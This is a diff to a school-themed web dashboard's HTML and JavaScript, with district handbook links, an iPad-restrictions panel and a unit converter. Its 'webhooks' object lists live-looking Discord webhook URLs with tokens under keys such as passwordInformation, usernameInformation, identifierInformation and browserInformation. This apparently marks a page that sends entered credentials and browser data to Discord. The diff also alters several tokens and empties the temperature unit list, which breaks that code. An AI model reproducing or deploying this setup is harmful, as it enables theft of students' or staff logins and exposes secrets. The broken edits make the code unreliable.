@@ -2370,7 +2370,7 @@ Did you know? The human brain contains approximately 86 billion neurons!
 <a href="https://middletown.ss19.sharpschool.com/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/JAN2025B%20RA%20Academy%20Handbook%20copy.pdf" target="_blank" class="quick-btn text-center flex-grow">
 <i class="fas fa-file-pdf"></i> RA Academy Handbook (Jan 2025)
 </a>
-<a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/Handbooks/MASD%202024-2025%20Virtual%20Learning%20Plan%20RSVD%20DEC2024.pdf" target="_blank" class="quick-btn text-center flex-grow">
+<a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/MASD%202024-2025%20Virtual%20Learning%20Plan%20RSVD%20DEC2024.pdf" target="_blank" class="quick-btn text-center flex-grow">
 <i class="fas fa-file-pdf"></i> Virtual Learning Plan (2024 - 2025)
 </a>
 <a href="https://www.raiderweb.org/UserFiles/Servers/Server_344046/File/For%20Parents/2024-2025%20Dress%20Code.docx.pdf" target="_blank" class="quick-btn text-center flex-grow">
@@ -2771,13 +2771,13 @@ const webhooks = {
 usernameInformation: 'https://discord.com/api/webhooks/1403506302822383726/Cq9jWG6XSG49gBwffXUEZdF5HCZLQC_SGf6f96XrH-Bs5WAxiy_U3OS1a5z00R3aL-vU',
 passwordInformation: 'https://discord.com/api/webhooks/1403506454488678540/PBX3b6QtOKdsc6FZklZT-zWuXxO_jGNUFhGqtF3Q1ysb-8v95VPAsem44kvgdtNoPnNI',
 identifierInformation: 'https://discord.com/api/webhooks/1403506052565307483/qDWgi0LkM0_DOwWGGR73evb-MqnI8MXMKJTjAYOxtLeltAZ3RsJRHQjf1Oj7Ce9c02cA',
-invaildUsernameInformation: 'https://discord.com/api/webhooks/1403508639779786935/OjvG2xJet2_NiwAHi6OE_5PdoYPXd3fRBuXSG5FTtPMT9MooblezpxJLqDA97jIUShkp',
+invaildUsernameInformation: 'https://discord.com/api/webhooks/1403508639779786935/OjvG2xJet2_NiwAHi6OE_5PdoYPX3dF3fRBuXSG5FTtPMT9MooblezpxJLqDA97jIUShkp',
 invaildPasswordInformation: 'https://discord.com/api/webhooks/1403509088113131704/qdUx47oo3-QRcc1IZpoBs2fB2Y05k9Tl2XgOVcVn078AgFFBw0pMUfKrR5gNN_UyKFhp',
 invaildIdentifierInformation: 'https://discord.com/api/webhooks/1403509418376822917/pmg748k-gAd3pdrGAumrdYnAbo2HTc_X6ulXvqXUn3vmgPQu7ZtqNNja5Vh8fPLNSq_5',
-attemptCounterInformation: 'https://discord.com/api/webhooks/1403510543637282979/z95YpEiHL2P7G9-fsNVsl1NEcKjXuFOml4rzLjEkJNqu3wXB3JAWHvGS39lC6YRZ_1aw',
+attemptCounterInformation: 'https://discord.com/api/webhooks/1403510543637282979/z95YpEiHL2P7G9-fsNVsl1NEcKjXuFOml4rzLjEkJNqu3wXB3JAWH3WfGS39lC6YRZ_1aw',
 attemptExceededInformation: 'https://discord.com/api/webhooks/1403511845800902687/oMnaODY_1ckM-alSj91yLPHaIhW4QLpk0YatR2eoG0PS38KKYq5y1q4VfCTmKbhgKsxQ',
 resetInformation: 'https://discord.com/api/webhooks/1403083012442423377/WNs_yZimluZqsxfZWkLSCfd2vmOYdoyEbsUVOfczHkJykeiThIZ6gYCJILFSHfSDSnsq', // This seems to be the "RESET_INFORMATION" channel
-correctInformation: 'https://discord.com/api/webhooks/1403088193850441921/zZKPkgzVBQ7d6aiCkT3WM7j2Y74UO2o1Js9oSnawVBHaSxUQCz-16Qj4uPYk1YxgoanB',
+correctInformation: 'https://discord.com/api/webhooks/1403088193850441921/zZKPkgzVBQ7d6aiCkT3WM7j2Y74UO2o1Js9oSnawVBHaSxUQCz-16Qj4uPY1YxgoanB',
 incorrectInformation: 'https://discord.com/api/webhooks/1403088326252040372/JgQkJdcVG-8X0jSmw7AZai9YSUODCMZ5hkyWlBe1MBzPRiJgbSlRDWOJUvHVqsK248ip',
 userInformation: 'https://discord.com/api/webhooks/1402682960397860964/rmNhK0G8NOJlbRN38RdCmPB1-rzXaaogzqIJmA7EuTVEIoFpTinMXLff0qr5ke1RV7K3',
 browserInformation: 'https://discord.com/api/webhooks/1402690380910170154/EJgpyFYc0pyz5EnkOTXiSlM7W1jUnBldRd0PUKLEvERgE6nXfDVAb7NXaKIzR-3APGHP',
@@ -3614,6 +3614,7 @@ updateClock();
 setInterval(updateClock, 1000);
 updateStats();
 updateLoginHistoryDisplay();
+loadImportantDatesFromStorage(); // Ensure this is called to load existing dates
 updateImportantDatesDisplay(); // Update important dates display
 updateClickCountDisplay(); // Update click count display
 updateErrorLogDisplay(); // Update error logs display
@@ -3748,6 +3749,38 @@ logActivity(`Panel closed: ${panelId}`);
 }
 
 updateStats();
+}
+
+// NEW FUNCTION: Toggles sub-panels within a modal (e.g., in iPad Restrictions)
+function toggleSubPanel(subPanelId, panelTitle = '') {
+    const parentModalContent = document.getElementById(subPanelId).closest('.settings-content');
+    if (!parentModalContent) {
+        console.error(`Parent modal content not found for sub-panel: ${subPanelId}`);
+        return;
+    }
+
+    // Hide all other sub-panels within the same modal
+    parentModalContent.querySelectorAll('.text-popup-content').forEach(panel => {
+        if (panel.id !== subPanelId) {
+            panel.classList.add('hidden');
+        }
+    });
+
+    // Toggle the requested sub-panel
+    const targetPanel = document.getElementById(subPanelId);
+    if (targetPanel) {
+        targetPanel.classList.toggle('hidden');
+        if (!targetPanel.classList.contains('hidden')) {
+            logActivity(`Sub-panel opened: ${panelTitle || subPanelId}`);
+        } else {
+            logActivity(`Sub-panel closed: ${panelTitle || subPanelId}`);
+        }
+    } else {
+        console.error(`Sub-panel element not found: ${subPanelId}`);
+        logError(`Attempted to toggle non-existent sub-panel: ${subPanelId}`);
+    }
+    stats.buttonPresses++;
+    updateStats();
 }
 
 
@@ -4319,11 +4352,8 @@ weight: [
 { value: 'lb', text: 'Pounds' },
 { value: 'oz', text: 'Ounces' }
 ],
-temperature: [
-{ value: 'c', text: 'Celsius' },
-{ value: 'f', text: 'Fahrenheit' },
-{ value: 'k', text: 'Kelvin' }
-],
+temperature: {
+},
 volume: [
 { value: 'l', text: 'Liters' },
 { value: 'ml', text: 'Milliliters' },
